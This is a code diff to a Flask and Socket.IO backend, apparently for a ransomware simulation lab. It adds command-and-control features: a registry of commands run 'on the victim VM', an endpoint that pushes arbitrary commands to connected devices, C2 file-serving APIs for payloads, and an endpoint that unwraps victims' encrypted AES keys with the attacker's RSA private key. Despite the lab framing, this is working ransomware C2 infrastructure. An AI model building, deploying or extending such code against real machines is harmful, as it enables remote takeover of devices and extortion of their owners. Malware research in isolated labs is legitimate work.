@@ -25,20 +25,63 @@ except ImportError:  # pragma: no cover - runtime env dependent
     from behavior_simulator import BehaviorSimulator
 import os, json, socket, base64, sys, subprocess
 from hashlib import sha256
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
+from flask import send_from_directory
 
 app = Flask(__name__)
 CORS(app)  # Enable CORS for all routes
 # Socket.IO for device signaling (encrypt/decrypt). Use permissive CORS for lab use.
-socketio = SocketIO(app, cors_allowed_origins="*")
+from .socket_core import init_socketio
 
 # Initialize the simulator; allow override via env var SANDBOX_DIR
 simulator = SafeRansomwareSimulator(os.getenv('SANDBOX_DIR') or None)
 
 # Simple in-memory device registry: token -> { sid, connected, pending_encrypt }
 DEVICES = {}
+
+# Simple scripts registry (commands run on the victim VM). Edit via APIs below.
+SCRIPTS = {
+    'scriptA': {
+        'label': 'Script A (py_simple device client)',
+        'command': 'python C\\\\Users\\\\user\\\\py_sample\\\\py_simple\\\\device_client.py'
+    },
+    'scriptB': {
+        'label': 'Script B (c sample)',
+        'command': 'python C\\\\Users\\\\user\\\\c\\\\device_client.py'
+    }
+}
 behavior = BehaviorSimulator(simulator.test_directory)
+
+# Initialize Socket.IO with the real registry/simulator
+socketio = init_socketio(app, devices_registry=DEVICES, simulator=simulator)
+
+# --- C2 Files Directory (optional) ---
+# Configure a local directory to list/serve files from this backend. Useful when
+# running the backend on the same host that stores payloads/scripts.
+C2_FILES_DIR = os.getenv('C2_FILES_DIR')  # e.g., /home/hari/Downloads/c2_files
+C2_TOKEN = os.getenv('C2_TOKEN')  # optional access token to guard file APIs
+
+def _c2_authorized():
+    if not C2_TOKEN:
+        return True
+    provided = request.headers.get('X-C2-TOKEN') or request.args.get('token')
+    return provided == C2_TOKEN
+
+def _c2_root_real():
+    if not C2_FILES_DIR:
+        return None
+    return os.path.realpath(C2_FILES_DIR)
+
+def _safe_join_c2(subpath: str | None):
+    base = _c2_root_real()
+    if not base:
+        return None
+    sp = (subpath or '').lstrip('/\\')
+    full = os.path.realpath(os.path.join(base, sp))
+    if not full.startswith(base + os.sep) and full != base:
+        return None
+    return full
 
 @app.route('/status', methods=['GET'])
 def status():
@@ -136,6 +179,17 @@ def py_simple_ui():
                 </div>
             </div>
 
+            <div class=\"card\">
+                <div class=\"row\" style=\"justify-content:space-between;\">
+                    <h3 style=\"margin:.25rem 0;\">Run Script on Device</h3>
+                    <div class=\"row\"> 
+                        <select id=\"scriptSel\"></select>
+                        <button class=\"btn primary\" id=\"runBtn\">Run</button>
+                    </div>
+                </div>
+                <p class=\"muted\">Pick a predefined command (Script A/B) or add your own via API. The command runs on the selected device.</p>
+            </div>
+
             <div class=\"card muted\" id=\"status\">Ready.</div>
         </div>
 
@@ -148,6 +202,7 @@ def py_simple_ui():
                 gen: document.getElementById('genKeys'), attach: document.getElementById('attachKeys'),
                 pub: document.getElementById('pub'), prv: document.getElementById('prv'),
                 devPub: document.getElementById('devPub'), devPrv: document.getElementById('devPrv'),
+                scriptSel: document.getElementById('scriptSel'), run: document.getElementById('runBtn'),
             };
 
             function setStatus(msg) { els.status.textContent = msg; }
@@ -171,6 +226,7 @@ def py_simple_ui():
             }
 
             let devices = [];
+            let scripts = [];
             function currentToken() { return els.sel.value || (devices[0] && devices[0].token) || ''; }
             function renderDevices() {
                 els.sel.innerHTML = devices.map(d => {
@@ -192,6 +248,18 @@ def py_simple_ui():
             async function loadDevices() {
                 try { const data = await fetchJSON(apiBase + '/devices'); devices = data.devices||[]; renderDevices(); setStatus('Devices loaded'); }
                 catch (e) { setStatus('Failed to load devices: ' + e.message); }
+            }
+
+            function renderScripts() {
+                els.scriptSel.innerHTML = scripts.map(s => '<option value="' + s.id + '">' + (s.label||s.id) + '</option>').join('');
+            }
+
+            async function loadScripts() {
+                try {
+                    const data = await fetchJSON(apiBase + '/scripts');
+                    scripts = data.scripts || [];
+                    renderScripts();
+                } catch (e) { setStatus('Failed to load scripts: ' + e.message); }
             }
 
             async function decryptSelected() {
@@ -218,14 +286,27 @@ def py_simple_ui():
                 } catch (e) { setStatus('Attach failed: ' + e.message); }
             }
 
+            async function runSelected() {
+                const tok = currentToken(); if (!tok) return setStatus('Select a device first');
+                const id = els.scriptSel.value; if (!id) return setStatus('Select a script');
+                const script = scripts.find(x => x.id === id);
+                if (!script || !script.command) return setStatus('Script has no command');
+                try {
+                    await fetchJSON(apiBase + '/device/run', { method: 'POST', body: JSON.stringify({ token: tok, command: script.command }) });
+                    setStatus('Run command sent');
+                } catch (e) { setStatus('Run failed: ' + e.message); }
+            }
+
             els.refresh.addEventListener('click', loadDevices);
             els.decrypt.addEventListener('click', decryptSelected);
             els.gen.addEventListener('click', generateKeys);
             els.attach.addEventListener('click', attachKeys);
             els.sel.addEventListener('change', renderDevices);
+            els.run.addEventListener('click', runSelected);
 
             loadWho();
             loadDevices();
+            loadScripts();
         </script>
     </body>
 </html>
@@ -351,6 +432,53 @@ def keys_rsa_private():
 def keys_rsa_private_prefixed():
     return keys_rsa_private()
 
+@app.route('/keys/unwrap', methods=['POST'])
+def keys_unwrap():
+    """Unwrap a wrapped (RSA-encrypted) AES key using the attacker's RSA private key.
+
+    Body:
+      - token: device token (used to look up stored private_key_pem), optional if private_key_pem provided
+      - wrapped_key_base64: base64 of RSA-OAEP(SHA256) encrypted AES key
+      - private_key_pem: optional PEM to use instead of stored device private key (lab/demo)
+
+    Returns: { aes_key_base64: str }
+    """
+    try:
+        payload = request.get_json(force=True)
+        token = (payload or {}).get('token')
+        wrapped_b64 = (payload or {}).get('wrapped_key_base64')
+        prv_pem = (payload or {}).get('private_key_pem')
+        if not wrapped_b64:
+            return jsonify({'error': 'bad_request', 'message': 'wrapped_key_base64 required'}), 400
+        if not prv_pem:
+            if not token or token not in DEVICES:
+                return jsonify({'error': 'bad_request', 'message': 'token required or private_key_pem'}), 400
+            prv_pem = DEVICES[token].get('private_key_pem')
+        if not prv_pem:
+            return jsonify({'error': 'not_configured', 'message': 'No private key available'}), 400
+        try:
+            private_key = serialization.load_pem_private_key(prv_pem.encode(), password=None)
+        except Exception as e:
+            return jsonify({'error': 'invalid_key', 'message': f'Failed to load private key: {e}'}), 400
+        try:
+            wrapped = base64.b64decode(wrapped_b64)
+        except Exception as e:
+            return jsonify({'error': 'invalid_payload', 'message': f'Invalid base64: {e}'}), 400
+        try:
+            aes_key = private_key.decrypt(
+                wrapped,
+                padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+            )
+        except Exception as e:
+            return jsonify({'error': 'decrypt_failed', 'message': str(e)}), 400
+        return jsonify({'aes_key_base64': base64.b64encode(aes_key).decode()})
+    except Exception as e:
+        return jsonify({'error': 'unwrap_failed', 'message': str(e)}), 500
+
+@app.route('/py_simple/keys/unwrap', methods=['POST'])
+def keys_unwrap_prefixed():
+    return keys_unwrap()
+
 @app.route('/publickey', methods=['POST'])
 def publickey_register():
     """Device requests a public key and receives a device token for WebSocket auth.
@@ -425,9 +553,8 @@ def decrypt():
         # If a specific device token is provided and connected, emit only to that device
         if target_token and target_token in DEVICES and DEVICES[target_token].get('sid'):
             sid = DEVICES[target_token]['sid']
-            # If no private key provided in request, try to use stored device key
-            if not private_key_pem:
-                private_key_pem = DEVICES[target_token].get('private_key_pem')
+            # Only include private key if explicitly provided in the request for lab demo.
+            # Otherwise, do NOT push private key to the device; device will request unwrap from website.
             emit_payload = ({'private_key_pem': private_key_pem} if private_key_pem else None)
             socketio.emit('decrypt', emit_payload, to=sid)
             # Also attempt local decrypt as a safety net
@@ -436,7 +563,7 @@ def decrypt():
             except Exception:
                 pass
             return jsonify({'status': 'Decrypt signal sent to device', 'token': target_token}), 200
-        # Otherwise broadcast to all connected clients in this process, optionally passing a private key.
+        # Otherwise broadcast to all connected clients; do not include private key unless explicitly provided.
         emit_payload = ({'private_key_pem': private_key_pem} if private_key_pem else None)
         socketio.emit('decrypt', emit_payload, broadcast=True)
         # Also attempt local decrypt as a safety net (no harm if no local files)
@@ -478,6 +605,97 @@ def devices_state():
 @app.route('/py_simple/devices', methods=['GET'])
 def devices_state_prefixed():
     return devices_state()
+
+@app.route('/scripts', methods=['GET'])
+def scripts_list():
+    try:
+        out = []
+        for sid, meta in SCRIPTS.items():
+            out.append({'id': sid, 'label': meta.get('label'), 'command': meta.get('command')})
+        return jsonify({'scripts': out})
+    except Exception as e:
+        return jsonify({'error': 'list_failed', 'message': str(e)}), 500
+
+@app.route('/py_simple/scripts', methods=['GET'])
+def scripts_list_prefixed():
+    return scripts_list()
+
+@app.route('/scripts', methods=['POST'])
+def scripts_add():
+    try:
+        data = request.get_json(force=True)
+        sid = data.get('id'); command = data.get('command'); label = data.get('label') or sid
+        if not sid or not command:
+            return jsonify({'error': 'bad_request', 'message': 'id and command required'}), 400
+        SCRIPTS[sid] = {'label': label, 'command': command}
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        return jsonify({'error': 'save_failed', 'message': str(e)}), 500
+
+@app.route('/py_simple/scripts', methods=['POST'])
+def scripts_add_prefixed():
+    return scripts_add()
+
+# --- C2 files APIs ---
+@app.route('/c2', methods=['GET'])
+def c2_root():
+    if not _c2_authorized():
+        return jsonify({'error': 'forbidden'}), 403
+    root = _c2_root_real()
+    if not root or not os.path.isdir(root):
+        return jsonify({'files': [], 'root': root, 'configured': False})
+    items = []
+    for name in sorted(os.listdir(root)):
+        p = os.path.join(root, name)
+        try:
+            stat = os.stat(p)
+            items.append({'name': name, 'is_dir': os.path.isdir(p), 'size': stat.st_size})
+        except Exception:
+            pass
+    return jsonify({'files': items, 'root': root, 'configured': True})
+
+@app.route('/py_simple/c2', methods=['GET'])
+def c2_root_prefixed():
+    return c2_root()
+
+@app.route('/c2/list', methods=['GET'])
+def c2_list():
+    if not _c2_authorized():
+        return jsonify({'error': 'forbidden'}), 403
+    path = request.args.get('path')
+    base = _safe_join_c2(path)
+    if not base or not os.path.isdir(base):
+        return jsonify({'error': 'not_found'}), 404
+    items = []
+    for name in sorted(os.listdir(base)):
+        p = os.path.join(base, name)
+        try:
+            stat = os.stat(p)
+            items.append({'name': name, 'is_dir': os.path.isdir(p), 'size': stat.st_size})
+        except Exception:
+            pass
+    return jsonify({'files': items, 'path': path or ''})
+
+@app.route('/py_simple/c2/list', methods=['GET'])
+def c2_list_prefixed():
+    return c2_list()
+
+@app.route('/c2/download', methods=['GET'])
+def c2_download():
+    if not _c2_authorized():
+        return jsonify({'error': 'forbidden'}), 403
+    rel = request.args.get('path')
+    base = _safe_join_c2(None)
+    full = _safe_join_c2(rel)
+    if not base or not full or not os.path.isfile(full):
+        return jsonify({'error': 'not_found'}), 404
+    directory = os.path.dirname(full)
+    filename = os.path.basename(full)
+    return send_from_directory(directory, filename, as_attachment=True)
+
+@app.route('/py_simple/c2/download', methods=['GET'])
+def c2_download_prefixed():
+    return c2_download()
 
 @app.route('/devices/<token>/public-key', methods=['POST'])
 def set_device_public_key(token: str):
@@ -641,115 +859,26 @@ if __name__ == '__main__':
     # For local dev. In production on Render, run with gunicorn -k eventlet ... server:app
     socketio.run(app, debug=True, port=5000)
 
-# --- Socket.IO handlers ---
-@socketio.on('connect')
-def on_connect():
-    emit('hello', {'msg': 'connected'})
+@app.route('/device/run', methods=['POST'])
+def device_run():
+    """Trigger execution of an arbitrary command on a connected device.
 
-@socketio.on('authenticate')
-def on_auth(data):
-    token = (data or {}).get('device_token')
-    if not token or token not in DEVICES:
-        return emit('auth_error', {'error': 'invalid_token'})
-    DEVICES[token]['sid'] = request.sid
-    DEVICES[token]['connected'] = True
-    emit('auth_ok', {'status': 'ok'})
-    # If encryption is pending for this device, trigger it now (one-time)
-    if DEVICES[token].get('pending_encrypt'):
-        socketio.emit('encrypt', to=request.sid)
-        DEVICES[token]['pending_encrypt'] = False
-
-@socketio.on('device_hello')
-def on_device_hello(data):
-    """Receive device metadata and public key over the socket."""
-    try:
-        token = (data or {}).get('device_token')
-        if not token:
-            # Try to resolve from sid
-            sid = request.sid
-            for t, info in DEVICES.items():
-                if info.get('sid') == sid:
-                    token = t
-                    break
-        if not token or token not in DEVICES:
-            return
-        DEVICES[token]['public_key_pem'] = (data or {}).get('public_key_pem')
-        if (data or {}).get('hostname'):
-            DEVICES[token]['hostname'] = data['hostname']
-        # Update requester IP based on this socket connect if available
-        try:
-            from flask import request as _rq
-            ip = _rq.remote_addr
-            if ip:
-                DEVICES[token]['ip'] = ip
-        except Exception:
-            pass
-        emit('server_ack', {'status': 'ok'})
-    except Exception:
-        pass
-
-@socketio.on('disconnect')
-def on_disconnect():
-    # Mark any known device with this sid as disconnected
-    try:
-        sid = request.sid
-        for token, info in DEVICES.items():
-            if info.get('sid') == sid:
-                info['connected'] = False
-                info['sid'] = None
-                break
-    except Exception:
-        pass
-
-@socketio.on('site_public_key')
-def on_site_public_key(data):
-    """Site sends a public key to associate with a device token."""
-    try:
-        token = (data or {}).get('token')
-        pem = (data or {}).get('public_key_pem')
-        if not token or token not in DEVICES or not pem:
-            return emit('server_ack', {'status': 'error'})
-        DEVICES[token]['public_key_pem'] = pem
-        emit('server_ack', {'status': 'ok'})
-    except Exception:
-        emit('server_ack', {'status': 'error'})
-
-@socketio.on('site_decrypt')
-def on_site_decrypt(data):
-    """Site triggers decrypt. If token provided, target that device; else broadcast.
-    Optionally carries a private key; otherwise uses stored key for the device if available.
+    Body: { token: str, command: str }
     """
     try:
-        token = (data or {}).get('token')
-        private_key_pem = (data or {}).get('private_key_pem')
-        if token and token in DEVICES and DEVICES[token].get('sid'):
-            sid = DEVICES[token]['sid']
-            if not private_key_pem:
-                private_key_pem = DEVICES[token].get('private_key_pem')
-            payload = {'private_key_pem': private_key_pem} if private_key_pem else None
-            socketio.emit('decrypt', payload, to=sid)
-            emit('server_ack', {'status': 'ok', 'targeted': True})
-            return
-        # Fallback to broadcast
-        payload = {'private_key_pem': private_key_pem} if private_key_pem else None
-        socketio.emit('decrypt', payload, broadcast=True)
-        emit('server_ack', {'status': 'ok', 'targeted': False})
+        payload = request.get_json(force=True)
+        token = (payload or {}).get('token')
+        command = (payload or {}).get('command')
+        if not token or not command:
+            return jsonify({'error': 'bad_request', 'message': 'token and command required'}), 400
+        info = DEVICES.get(token)
+        if not info or not info.get('connected') or not info.get('sid'):
+            return jsonify({'error': 'offline', 'message': 'device not connected'}), 400
+        socketio.emit('run_script', {'command': command}, to=info['sid'])
+        return jsonify({'status': 'ok'})
     except Exception as e:
-        emit('server_ack', {'status': 'error', 'message': str(e)})
+        return jsonify({'error': 'run_failed', 'message': str(e)}), 500
 
-@socketio.on('site_keys')
-def on_site_keys(data):
-    """Site sends both public/private keys to associate with a device token."""
-    try:
-        token = (data or {}).get('token')
-        pub = (data or {}).get('public_key_pem')
-        prv = (data or {}).get('private_key_pem')
-        if not token or token not in DEVICES or (not pub and not prv):
-            return emit('server_ack', {'status': 'error'})
-        if pub:
-            DEVICES[token]['public_key_pem'] = pub
-        if prv:
-            DEVICES[token]['private_key_pem'] = prv
-        emit('server_ack', {'status': 'ok'})
-    except Exception:
-        emit('server_ack', {'status': 'error'})
+@app.route('/py_simple/device/run', methods=['POST'])
+def device_run_prefixed():
+    return device_run()
